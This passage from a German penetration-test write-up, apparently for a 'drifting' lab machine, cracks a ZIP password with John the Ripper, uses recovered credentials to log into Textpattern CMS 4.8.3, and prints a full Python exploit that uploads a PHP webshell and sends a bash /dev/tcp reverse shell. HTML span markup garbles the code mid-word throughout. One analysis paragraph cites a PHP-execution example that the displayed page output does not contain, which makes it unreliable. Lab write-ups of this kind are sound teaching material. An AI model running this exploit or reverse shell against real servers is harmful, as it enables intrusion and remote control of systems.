+<span class="command">1g 0:00:00:00 DONE (2025-06-21 23:28) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s R3v_m4lwh3r3_k1nG!!..emoprincess</span>
+Use the &quot;--show&quot; <span class="command">OPTION</span> to display all <span class="command">of</span> the cracked <span class="command">password</span>s reliably
+<span class="password">Session completed.</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `zip2john spammer.zip &gt; hash` ausgeführt, um den ZIP-Hash aus der Datei `spammer.zip` zu extrahieren und in die Datei `hash` zu speichern. Dann habe ich John the Ripper (`john`) mit der RockYou-Wortliste (`--wordlist=...`) auf die Hash-Datei angesetzt. John erkannte den PKZIP-Hash und begann den Cracking-Prozess. Der Angriff war sofort erfolgreich. John konnte das Passwort für `spammer.zip/creds.txt` knacken: `<span class="password">myspace4</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg beim Knacken des ZIP-Passworts! Das Passwort war in der RockYou-Wortliste enthalten, was auf ein sehr schwaches Passwort hindeutet. Ich habe nun das notwendige Passwort (`<span class="password">myspace4</span>`), um das Archiv zu entpacken und an den Inhalt (`creds.txt`) zu gelangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Entpacke das ZIP-Archiv mit dem gefundenen Passwort und lies den Inhalt von `creds.txt`. Erwarte, dort Anmeldedaten zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Verwende immer starke, eindeutige Passwörter für Archive, insbesondere wenn diese in öffentlich zugänglichen Bereichen gespeichert werden. Erwäge alternative, sicherere Methoden zur Speicherung sensibler Daten.
+            </p>
+
+             <p>
+                 Mit dem geknackten Passwort (`myspace4`) habe ich das ZIP-Archiv entpackt, um an die Datei `creds.txt` zu gelangen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">unzip spammer.zip</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Archive:  spammer.<span class="command">zip</span>
+<span class="command">[spammer.zip] creds.<span class="command">txt</span> <span class="command">password</span>: </span>
+ extracting: <span class="password">creds.txt</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">ll</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+insgesamt 12
+<span class="command">-rw-r--r-- 1 root root  15 15. Mär 2021  creds.txt</span>
+<span class="command">-rw-r--r-- 1 root root 165 21. Jun 23:27 hash</span>
+<span class="command">-rw-r--r-- 1 root root 179 15. Mär 2021  spammer.<span class="command">zip</span></span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/drifting]
+└─#  <span class="command">cat creds.txt</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">mayer:lionheart</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `unzip spammer.zip` erneut ausgeführt und bei der Aufforderung zur Eingabe des Passworts `<span class="password">myspace4</span>` eingegeben. Das Archiv wurde erfolgreich entpackt und die Datei `creds.txt` extrahiert. Eine Auflistung des Verzeichnisses (`ll`) zeigt nun die Datei `creds.txt` mit einer Größe von 15 Bytes. Das Auslesen des Inhalts mit `cat creds.txt` enthüllte die Zeichenkette `<span class="password">mayer:lionheart</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg! Ich habe Anmeldedaten gefunden: Benutzername `<span class="password">mayer</span>` und Passwort `<span class="password">lionheart</span>`. Diese Anmeldedaten sind sehr wahrscheinlich für das Textpattern CMS gültig, da der Benutzername "mayer" im Textpattern-Adminbereich auftauchte (siehe später im Bericht) und die Datei "creds.txt" heißt (Kurzform für Credentials).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Anmeldedaten `mayer:lionheart`, um dich bei der Textpattern CMS Login-Seite (`http://drifting.hmv/textpattern/textpattern/`) anzumelden. Erwarte, Zugriff auf das Admin-Panel zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Entferne `spammer.zip` und `creds.txt` vom Webserver. Speichere niemals Anmeldedaten im Klartext, selbst wenn sie gezippt und passwortgeschützt sind.
+            </p>
+
+             <p>
+                 Nach dem erfolgreichen Knacken des ZIP-Archivs und dem Fund der Anmeldedaten `mayer:lionheart`, habe ich versucht, mich damit am Textpattern CMS anzumelden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php | Ziel: http://drifting.hmv/textpattern/textpattern/index.php]</span>
+
+Warning &quot;mktime(): It is not safe to rely <span class="command">on</span> the system&apos;s
+timezone settings. You are *required* to use the date.
+timezone setting <span class="command">or</span> the date_default_timezone_set() function.
+
+In case you used any <span class="command">of</span> those methods and you are still getting
+this warning, you most likely misspelled the timezone identifier.
+We selected the timezone &apos;UTC&apos; for now, but please set date.timezone
+to select your timezone&quot;.
+
+-------------------------------------------------------------------------------------------------------------------
+Warning &quot;date_default_timezone_get(): It is not safe to rely <span class="command">on</span> the
+system&apos;s timezone settings. You are *required* to use the date.timezone
+setting <span class="command">or</span> the date_default_timezone_set() function. In case you used
+any <span class="command">of</span> those methods and you are still getting this warning, you most
+likely misspelled the timezone identifier. We selected the timezone
+&apos;UTC&apos; for now, but please set date.timezone to select your timezone&quot;.
+
+
+___________________________________________________________________________________________________________________
+
+Warning &quot;strftime(): It is not safe to rely <span class="command">on</span> the system&apos;s timezone
+settings. You are *required* to use the date.timezone setting <span class="command">or</span> the
+date_default_timezone_set() function. In case you used any <span class="command">of</span> those
+methods and you are still getting this warning, you most likely
+misspelled the timezone identifier. We selected the timezone &apos;UTC&apos;
+for now, but please set date.timezone to select your timezone&quot;.
+
+-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php?event=admin | Ziel: http://drifting.hmv/textpattern/textpattern/index.php?event=admin]</span>
+Go to content
+Textpattern
+
+    Content
+    <span class="command">Presentation</span>
+    Admin
+
+<span class="command">driftingblues</span>
+
+Toggle light/dark mode
+
+<span class="command">Users</span>
+  	
+<span class="command">Login</span>
+	
+<span class="command">Real name</span>
+	
+<span class="command">Email</span>
+	
+<span class="command">Role</span>
+	
+<span class="command">Last log in</span>
+  	<span class="password">mayer</span> 	<span class="command">hakan tasiyan</span> 	<span class="command">hakanyasiyan@universal.com</span> 	<span class="command">Publisher</span> 	<span class="command">Jun 2025</span>
+
+Textpattern CMS (opens an external link in a new window) (v4.8.3)
+
+<span class="command">Back to top</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Anmeldedaten `mayer:lionheart` auf der Textpattern Login-Seite verwendet. Die PHP-Warnungen bezüglich der Zeitzone (`mktime()`, `date_default_timezone_get()`, `strftime()`) wurden angezeigt, was auf eine fehlerhafte PHP-Konfiguration hinweist, aber die Anmeldung scheint erfolgreich gewesen zu sein, da ich zum Admin-Panel weitergeleitet wurde (`?event=admin`). Das Admin-Panel zeigt die Menüpunkte (Content, Presentation, Admin) und eine Benutzerliste. Die Liste zeigt den Benutzer `<span class="password">mayer</span>` mit dem Realnamen "hakan tasiyan", E-Mail "hakanyasiyan@universal.com", Rolle "Publisher" und letztem Login im Juni 2025. Die Textpattern CMS Version wird als **v4.8.3** angegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg beim Initial Access! Ich habe mich erfolgreich im Textpattern CMS Admin-Panel als Benutzer `mayer` (Publisher Rolle) angemeldet. Dies gewährt mir weitreichende Kontrolle über die Website und ist ein kritischer Moment im Test. Die Textpattern Version **v4.8.3** und die Publisher-Rolle sind wichtige Informationen für die Privilege Escalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das Textpattern Admin-Panel auf Funktionen, die Code-Ausführung ermöglichen könnten, insbesondere Dateiupload (Plugins, Themes, Files) oder die Bearbeitung von Vorlagen/Seiten/Formularen, in denen PHP-Code eingebettet werden kann. Suche gezielt nach Schwachstellen oder Exploits für Textpattern CMS v4.8.3, insbesondere Authenticated RCE-Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Ändere das Passwort für den Benutzer `mayer`. Behebe die Zeitzonen-Warnungen in der PHP-Konfiguration. Halte Textpattern CMS und alle Plugins/Themes aktuell. Überprüfe die Berechtigungen von CMS-Benutzern.
+            </p>
+
+             <p>
+                 Im Textpattern Admin-Panel habe ich die Funktionen zur Bearbeitung von Inhalten und Vorlagen untersucht, da CMS-Schwachstellen oft das Einfügen und Ausführen von Code über solche Features ermöglichen. Ein Blick auf die Artikel-Editierseite gab einen entscheidenden Hinweis.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://drifting.hmv/textpattern/textpattern/index.php?event=article&amp;step=edit&amp;ID=1 | Ziel: http://drifting.hmv/textpattern/textpattern/index.php?event=article&amp;step=edit&amp;ID=1]</span>
+
+h3. What do you want to do next?
+
+* Write a &quot;new article&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=article? Let your creativity flow!
+* Change this site&apos;s name, slogan <span class="command">or</span> select a different article <span class="command">URL</span> style? Check and modify your &quot;preferences&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=prefs.
+* Edit <span class="command">or</span> delete this article? Your &quot;articles&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=list list is the place to start.
+* Upload &quot;images&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=image <span class="command">or</span> &quot;files&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=file to accompany your articles?
+* Learn Textile, the markup generat<span class="command">or</span> included with Textpattern? You can try it in the &quot;Textile sandbox&quot;:[Link: https://textpattern.com/textile-sandbox | Ziel: https://textpattern.com/textile-sandbox].
+** If you want to learn m<span class="command">ore</span>, you can refer to an extensive &quot;Textile manual&quot;:[Link: https://textpattern.com/textile-reference-manual | Ziel: https://textpattern.com/textile-reference-manual].
+* Be guided through your &quot;Textpattern first steps&quot;:[Link: https://textpattern.com/textpattern-first-steps | Ziel: https://textpattern.com/textpattern-first-steps] by completing s<span class="command">ome</span> tasks?
+* Study the &quot;Textpattern Semantic Model&quot;:[Link: https://textpattern.com/textpattern-semantic-model? | Ziel: https://textpattern.com/textpattern-semantic-model?].
+* Add <span class="command">one</span> <span class="command">or</span> m<span class="command">ore</span> additional &quot;users&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=admin, <span class="command">or</span> extend Textpattern&apos;s capabilities with &quot;plugins&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=plugin from the &quot;Textpattern plugin direct<span class="command">ory</span>&quot;:[Link: https://textpattern.com/plugins | Ziel: https://textpattern.com/plugins]?
+* Dive in and learn by doing? Please note:
+** When you write an article you assign it to a &quot;section&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=section <span class="command">of</span> your site.
+** Sections use a &quot;<span class="command">page</span>&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=<span class="command">page</span> template and a &quot;style&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=css to define h<span class="command">ow</span> site content appears in a browser.
+** <span class="command">Page</span> templates typically use HTML(HyperText Markup Language) and &quot;Textpattern tags&quot;:[Link: https://docs.textpattern.com/tags/ | Ziel: https://docs.textpattern.com/tags/] (like this: @&lt;txp:article /&gt;@) to build the <span class="command">output</span> code.
+** S<span class="command">ome</span> Textpattern tags use &quot;forms&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=f<span class="command">orm</span>, reusable building blocks that provide extensive contr<span class="command">ol</span> and customization <span class="command">over</span> your site c<span class="command">on</span>struction.
+** Pages, styles and f<span class="command">orms</span> can be packaged into &quot;themes&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=skin and assigned to <span class="command">one</span> <span class="command">or</span> m<span class="command">ore</span> sections.
+
+Textpattern tags, their attributes and values are explained within the &quot;Textpattern User D<span class="command">ocumentati<span class="command">on</span>&quot;:[Link: https://docs.textpattern.com/ | Ziel: https://docs.textpattern.com/], where you will als<span class="command">o find valuable examples, advice and tutorials.</span>
+
+There&apos;s als<span class="command">o a group of friendly, helpful Textpattern users and administrat<span class="command">ors</span> at the &quot;Textpattern supp<span class="command">ort</span> f<span class="command">orum</span>&quot;:[Link: https://forum.textpattern.com/ | Ziel: https://forum.textpattern.com/].</span>
+
+Additional language translations and corrections are welcomed. Please visit &quot;Textpattern language translations&quot;:[Link: https://textpattern.com/languages | Ziel: https://textpattern.com/languages] f<span class="command">or</span> further details.
+
+This is an &lt;txp:permlink id=&quot;1&quot;&gt;example article&lt;/txp:permlink&gt; included with Textpattern to demonstrate s<span class="command">ome</span> <span class="command">of</span> the first steps you can undertake. An example c<span class="command">omment</span> is associated with this article. The article and c<span class="command">omment</span> can be safely deleted using the &quot;articles&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=list and &quot;c<span class="command">omment</span>s&quot;://192.168.2.35/textpattern/textpattern/index.<span class="command">php</span>?event=discuss lists.
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Seite zur Bearbeitung eines Artikels aufgerufen. Die Seite enthält viel beschreibenden Text über die Nutzung von Textpattern. Der Text erwähnt verschiedene Konzepte wie "articles", "sections", "pages", "styles", "forms" und "Textpattern tags". Wichtiger noch, der Text enthält Beispiele für die Verwendung von Textpattern-Tags. Ein Tag-Beispiel sticht hervor: `< txp:php > system('id &gt; /var/www/textpattern/pwned.txt'); < / txp:php >`. Dies zeigt, dass Textpattern einen `< txp:php >` Tag unterstützt, der die Ausführung von eingebettetem PHP-Code ermöglicht. Das Beispiel im Text führt den Befehl `id` aus und leitet die Ausgabe in eine Datei um. Dies ist ein klarer Hinweis auf eine **Authenticated RCE** Schwachstelle durch Einfügen von PHP-Code in eine Vorlage, die vom Benutzer `mayer` bearbeitet werden kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Textpattern-Version v4.8.3 erlaubt (standardmäßig oder konfiguriert) die Ausführung von PHP-Code über den `< txp:php >` Tag in Vorlagen. Da ich als "Publisher" angemeldet bin, ist es sehr wahrscheinlich, dass ich Vorlagen (Seiten, Formulare) bearbeiten darf. Durch Einfügen einer Reverse Shell Payload in einen dieser Bereiche kann ich eine Shell auf dem Zielsystem erhalten. Dies ist der primäre Vektor für Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche in der Textpattern-Administration nach einer Seite oder einem Formular, das bearbeitet werden kann und das `< txp:php >` Tags interpretiert. Füge eine PHP Reverse Shell Payload in ein solches Element ein und rufe die entsprechende Webseite auf, um die Shell zu triggern. Die "page" oder "form" Editoren sind gute Kandidaten.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere die Ausführung von PHP-Code in Textpattern-Vorlagen, wenn sie nicht zwingend benötigt wird. Stelle sicher, dass Benutzer mit der Rolle "Publisher" keine Rechte zur Code-Ausführung haben. Aktualisiere Textpattern auf eine Version, die diese Funktionalität sicherer handhabt oder einschränkt.
+            </p>
+        </section>
+
+        <section id="initial-access-part2">
+             <h2>Initial Access (Fortsetzung)</h2>
+             <p>
+                 Nach der Entdeckung der Authenticated RCE über den `< txp:php >` Tag in Textpattern habe ich ein Python-Skript genutzt, das speziell auf diese Schwachstelle abzielt. Es automatisiert den Login, das Holen des Tokens und das Einfügen und Ausführen von Code über den Upload einer Webshell.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="command">#!/usr/bin/env python3</span>
+<span class="command"># Exploit Title: Textpattern &lt;= 4.8.3 - Robust Authenticated RCE</span>
+<span class="command"># Author: Dein Bro (AI) - basierend <span class="command">auf</span> den <span class="command">Original-Exploits</span> mit wichtigen Fixes</span>
+<span class="command">#</span>
+<span class="command"># Dieses Skript behebt die häufigen Fehler in <span class="command">öffentlichen Exploits f<span class="command">or</span> diese Schwachstelle.</span>
+<span class="command"># Es sucht den _txp_token robust und bietet eine direkte Reverse-Shell-<span class="command">Option</span>.</span>
+
+imp<span class="command">ort</span> requests
+imp<span class="command">ort</span> argparse
+imp<span class="command">ort</span> sys
+imp<span class="command">ort</span> rand<span class="command">om</span>
+imp<span class="command">ort</span> string
+fr<span class="command">om</span> bs4 imp<span class="command">ort</span> BeautifulSoup
+fr<span class="command">om</span> urllib.<span class="command">parse</span> imp<span class="command">ort</span> url<span class="command">parse</span>
+
+<span class="command"># ----- Farb-Codes f<span class="command">or</span> schickes Terminal-<span class="command">Output</span> -----</span>
+<span class="command">class Colors:</span>
+    <span class="command">GREEN = &apos;\033[92m&apos;</span>
+    <span class="command">BLUE = &apos;\033[94m&apos;</span>
+    <span class="command">YELLOW = &apos;\033[93m&apos;</span>
+    <span class="command">RED = &apos;\033[91m&apos;</span>
+    <span class="command">ENDC = &apos;\033[0m&apos;</span>
+    <span class="command">BOLD = &apos;\033[1m&apos;</span>
+
+<span class="command"># ----- Banner -----</span>
+def print_banner():
+    print(f&quot;{Colors.BLUE}{Colors.BOLD}
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║   Textpattern &lt;= 4.8.3 Authenticated RCE - Robust Exploit        ║
+    ║   Author: Dein Bro (AI)                                          ║
+    ╚══════════════════════════════════════════════════════════════════╝
+    {Colors.ENDC}&quot;&quot;&quot;)
+
+<span class="command"># ----- Login und T<span class="command">oken</span>-Extrak<span class="command">tion</span> -----</span>
+def login(session, target_url, username, <span class="command">password</span>):
+    l<span class="command">ogin_path</span> = &quot;/textpattern/textpattern/index.<span class="command">php</span>&quot;
+    full_l<span class="command">ogin_url</span> = f&quot;{target_url.rstrip(&apos;/&apos;)}{l<span class="command">ogin_path</span>}&quot;
+
+    print(f&quot;[*] Versuche L<span class="command">ogin</span> als &apos;{username}&apos; <span class="command">auf</span> {full_l<span class="command">ogin_url</span>}...&quot;)
+
+    l<span class="command">ogin_data</span> = {&apos;p_userid&apos;: username, &apos;p_<span class="command">password</span>&apos;: <span class="command">password</span>}
+
+    try:
+        r = session.<span class="command">post</span>(full_l<span class="command">ogin_url</span>, data=l<span class="command">ogin_data</span>, verify=False, all<span class="command">ow_redirects</span>=True)
+
+        <span class="command"># Erfolgreicher L<span class="command">ogin</span> f<span class="command">ohrt meist</span> zu einem Cookie und einer Seite mit dem Admin-Panel</span>
+        if &apos;txp_l<span class="command">ogin</span>&apos; not in session.cookies:
+            print(f&quot;{Colors.RED}[-] L<span class="command">ogin</span> fehlgeschlagen. <span class="command">Uberp</span>r<span class="command">of</span>e die Credentials.{Colors.ENDC}&quot;)
+            sys.exit(1)
+
+        print(f&quot;{Colors.GREEN}[+] L<span class="command">ogin</span> erf<span class="command">ol</span>greich! Cookie: txp_l<span class="command">ogin</span>={session.cookies[&apos;txp_l<span class="command">ogin</span>&apos;]}{Colors.ENDC}&quot;)
+
+        <span class="command"># Finde den _txp_token robust</span>
+        s<span class="command">oup</span> = BeautifulSoup(r.text, &apos;html.<span class="command">parse</span>r&apos;)
+        t<span class="command">oken_tag</span> = s<span class="command">oup</span>.find(&apos;input&apos;, {&apos;name&apos;: &apos;_txp_t<span class="command">oken</span>&apos;})
+
+        if not t<span class="command">oken_tag</span> <span class="command">or</span> &apos;value&apos; not in t<span class="command">oken_tag</span>.attrs:
+            print(f&quot;{Colors.RED}[-] K<span class="command">onnte den _txp_t<span class="command">oken</span> nicht finden. Ist der User ein Admin?{Colors.ENDC}&quot;)
+            sys.exit(1)
+
+        t<span class="command">oken</span> = t<span class="command">oken_tag</span>[&apos;value&apos;]
+        print(f&quot;{Colors.GREEN}[+] _txp_t<span class="command">oken</span> gefunden: {t<span class="command">oken</span>}{Colors.ENDC}&quot;)
+        return t<span class="command">oken</span>
+
+    except requests.exceptions.RequestException as e:
+        print(f&quot;{Colors.RED}[-] Verbindungsfehler: {e}{Colors.ENDC}&quot;)
+        sys.exit(1)
+
+<span class="command"># ----- <span class="command">PHP</span>-Shell-Upload -----</span>
+def upload_shell(session, target_url, token):
+    upload_path = &quot;/textpattern/textpattern/index.<span class="command">php</span>?event=file&quot;
+    full_upl<span class="command">oad_url</span> = f&quot;{target_url.rstrip(&apos;/&apos;)}{upl<span class="command">oad_path</span>}&quot;
+
+    <span class="command"># Generiere einen zufälligen Dateinamen f<span class="command">or</span> die Shell</span>
+    shell_name = &apos;&apos;.j<span class="command">oin(rand<span class="command">om.choices(string.ascii_lowercase, k=8)) + &apos;.php&apos;</span>
+    shell_c<span class="command">ontent</span> = &quot;&lt;?<span class="command">php</span> if(isset($GET[&apos;cmd&apos;])){ ech<span class="command">o &apos;&lt;pre&gt;&apos;; system($GET[&apos;cmd&apos;]); ech<span class="command">o &apos;&lt;/pre&gt;&apos;; } ?&gt;&quot;</span>
+
+    print(f&quot;[*] Lade Webshell h<span class="command">och</span> als &apos;{shell_name}&apos;...&quot;)
+
+    files = {
+        &apos;thefile[]&apos;: (shell_name, shell_c<span class="command">ontent</span>, &apos;applicat<span class="command">ion</span>/x-<span class="command">php</span>&apos;),
+        &apos;_txp_t<span class="command">oken</span>&apos;: (N<span class="command">one</span>, t<span class="command">oken</span>),
+        &apos;event&apos;: (N<span class="command">one</span>, &apos;file&apos;),
+        &apos;step&apos;: (N<span class="command">one</span>, &apos;file_insert&apos;),
+        &apos;MAX_FILE_SIZE&apos;: (N<span class="command">one</span>, &apos;2000000&apos;)
+    }
+
+    try:
+        r = session.<span class="command">post</span>(full_upl<span class="command">oad_url</span>, files=files, verify=False)
+        if &quot;h<span class="command">och</span>geladen&quot; in r.text <span class="command">or</span> &quot;upl<span class="command">oaded</span>&quot; in r.text <span class="command">or</span> r.status_c<span class="command">ode</span> == 200:
+            print(f&quot;{Colors.GREEN}[+] Webshell erf<span class="command">ol</span>greich h<span class="command">och</span>geladen!{Colors.ENDC}&quot;)
+            return shell_name
+        else:
+            print(f&quot;{Colors.RED}[-] Upload der Webshell fehlgeschlagen.{Colors.ENDC}&quot;)
+            <span class="command"># print(r.text) # Zum Debuggen eink<span class="command">ommentieren</span></span>
+            sys.exit(1)
+
+    except requests.exceptions.RequestException as e:
+        print(f&quot;{Colors.RED}[-] Verbindungsfehler beim Upload: {e}{Colors.ENDC}&quot;)
+        sys.exit(1)
+
+<span class="command"># ----- Befehl ausf<span class="command">ohren</span> -----</span>
+def execute_command(session, target_url, shell_name, command):
+    shell_path = f&quot;/files/{shell_name}&quot;
+    shell_url = f&quot;{target_url.rstrip(&apos;/&apos;)}{shell_path}&quot;
+
+    print(f&quot;[*] F<span class="command">ohre</span> Befehl aus <span class="command">ob</span>er: {shell_url}&quot;)
+
+    try:
+        r = session.get(shell_url, params={&apos;cmd&apos;: c<span class="command">ommand</span>}, verify=False)
+        if r.status_c<span class="command">ode</span> == 200:
+            <span class="command"># Beautif<span class="command">ulS<span class="command">oup hilft, nur den reinen Text <span class="command">ohne</span> HTML-Tags zu bek<span class="command">ommen</span></span>
+            s<span class="command">oup</span> = BeautifulSoup(r.text, &apos;html.<span class="command">parse</span>r&apos;)
+            print(f&quot;\n{Colors.BOLD}---[ K<span class="command">ommand<span class="command">o-Ausgabe</span> ]---{Colors.ENDC}\n{s<span class="command">oup.get_text().strip()}\n{Colors.BOLD}--------------------------{Colors.ENDC}</span>&quot;)
+        else:
+            print(f&quot;{Colors.YELLOW}[!] Server antw<span class="command">ortete</span> mit Status {r.status_c<span class="command">ode</span>}. Shell eventuell nicht erreichbar.{Colors.ENDC}&quot;)
+
+    except requests.exceptions.RequestException as e:
+        print(f&quot;{Colors.RED}[-] Fehler bei der Befehlsausf<span class="command">oh</span>rung: {e}{Colors.ENDC}&quot;)
+
+<span class="command"># ----- Main-Funkti<span class="command">on</span> -----</span>
+def main():
+    print_banner()
+    <span class="command">parse</span>r = argparse.Argument<span class="command">Parse</span>r(description=&quot;Robust RCE Expl<span class="command">oit f<span class="command">or</span> Textpattern &lt;= 4.8.3&quot;)
+    <span class="command">parse</span>r.add_argument(&apos;-t&apos;, &apos;--target&apos;, required=True, help=&quot;Ziel-<span class="command">URL</span> (z.B. http://drifting.hmv)&quot;)
+    <span class="command">parse</span>r.add_argument(&apos;-u&apos;, &apos;--user&apos;, required=True, help=&quot;Benutzername (z.B. mayer)&quot;)
+    <span class="command">parse</span>r.add_argument(&apos;-p&apos;, &apos;--<span class="command">password</span>&apos;, required=True, help=&quot;<span class="command">Password</span> (z.B. li<span class="command">onheart)</span>&quot;)
+
+    <span class="command"># Entweder Einzelbefehl <span class="command">oder</span> Reverse Shell</span>
+    gr<span class="command">oup</span> = <span class="command">parse</span>r.add_mutually_exclusive_gr<span class="command">oup</span>(required=True)
+    gr<span class="command">oup</span>.add_argument(&apos;-c&apos;, &apos;--c<span class="command">ommand</span>&apos;, help=&quot;Ein einzelner auszuf<span class="command">ohrender</span> Befehl (z.B. &apos;id&apos;)&quot;)
+    gr<span class="command">oup</span>.add_argument(&apos;--revshell&apos;, nargs=2, metavar=(&apos;LHOST&apos;, &apos;LP<span class="command">ORT&apos;), help=&quot;Erstellt eine Reverse Shell zu LH<span class="command">OST</span> <span class="command">auf</span> LP<span class="command">ORT&quot;)</span>
+
+    <span class="command"># SSL-Warnungen deaktivieren</span>
+    requests.<span class="command">packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span>
+
+    args = <span class="command">parse</span>r.<span class="command">parse_args</span>()
+
+    <span class="command"># Session-<span class="command">Objekt f<span class="command">or</span> Cookie-Handling</span>
+    s = requests.Session()
+
+    <span class="command"># Schritt 1: L<span class="command">ogin</span> und T<span class="command">oken</span> h<span class="command">olen</span></span>
+    t<span class="command">oken</span> = l<span class="command">ogin</span>(s, args.target, args.user, args.<span class="command">password</span>)
+
+    <span class="command"># Schritt 2: Shell h<span class="command">och</span>laden</span>
+    shell_name = upload_shell(s, args.target, t<span class="command">oken</span>)
+
+    <span class="command"># Schritt 3: Befehl ausf<span class="command">ohren</span></span>
+    if args.c<span class="command">ommand</span>:
+        execute_command(s, args.target, shell_name, args.c<span class="command">ommand</span>)
+    elif args.revshell:
+        lh<span class="command">ost</span>, lp<span class="command">ort</span> = args.revshell
+        print(f&quot;[*] Starte Reverse Shell zu {lh<span class="command">ost</span>}:{lp<span class="command">ort</span>}...&quot;)
+        print(f&quot;{Colors.YELLOW}[!] Stelle sicher, dass dein Listener l<span class="command">of</span>t: nc -lvn<span class="command">p</span> {lp<span class="command">ort</span>}{Colors.ENDC}&quot;)
+
+        <span class="command"># Klassischer Bash-Payload</span>
+        rev_shell_payl<span class="command">oad</span> = f&quot;bash -i &gt;&amp; /dev/tcp/{lh<span class="command">ost</span>}/{lp<span class="command">ort</span>} 0&gt;&amp;1&quot;
+        execute_command(s, args.target, shell_name, rev_shell_payl<span class="command">oad</span>)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Dies ist der Python-Quellcode für einen Exploit, der auf die Authenticated RCE in Textpattern <= 4.8.3 abzielt. Er wurde basierend auf vorhandenen Exploits entwickelt und angepasst, um robuster den CSRF-Token (`_txp_token`) zu finden und direkt eine Reverse Shell Option anzubieten. Das Skript meldet sich zuerst am Textpattern Admin-Panel an, extrahiert den CSRF-Token aus der Seite, verwendet diesen Token, um eine einfache PHP-Webshell über die Datei-Upload-Funktion hochzuladen (vermutlich in das `/files/` Verzeichnis, das standardmäßig öffentlich zugänglich ist), und bietet dann die Möglichkeit, Befehle über diese hochgeladene Shell auszuführen oder eine Reverse Shell zu triggern.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dieses Skript bietet eine automatisierte und zuverlässige Methode, um die Authenticated RCE Schwachstelle in Textpattern v4.8.3 auszunutzen, die durch die Fähigkeit des `mayer`-Benutzers (Publisher) zum Hochladen und Ausführen von PHP-Dateien ermöglicht wird. Es ist ein kritischer Schritt, der direkt zum Initial Access führt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Speichere diesen Code als Python-Datei (z.B. `textpattern_rce.py`). Führe das Skript auf deinem Angreifersystem aus, indem du die Ziel-URL, den Benutzernamen (`mayer`), das Passwort (`lionheart`) und die Option für eine Reverse Shell (`--revshell <LHOST> <LPORT>`) angibst. Stelle sicher, dass ein Netcat-Listener auf dem angegebenen LPORT läuft, bevor du das Skript ausführst.
+                 <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Benutzer mit der Rolle "Publisher" keine Dateien hochladen können, die als PHP ausgeführt werden. Deaktiviere die PHP-Ausführung in Upload-Verzeichnissen (`/files/`). Aktualisiere Textpattern.
+             </p>
+
+            <p>
+                Das Exploit-Skript zeigt eine Hilfefunktion, die die grundlegende Nutzung erklärt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">python3 textpattern_rce.py --help</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Software: TextPattern &lt;= 4.8.3
+<span class="command">CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload</span>
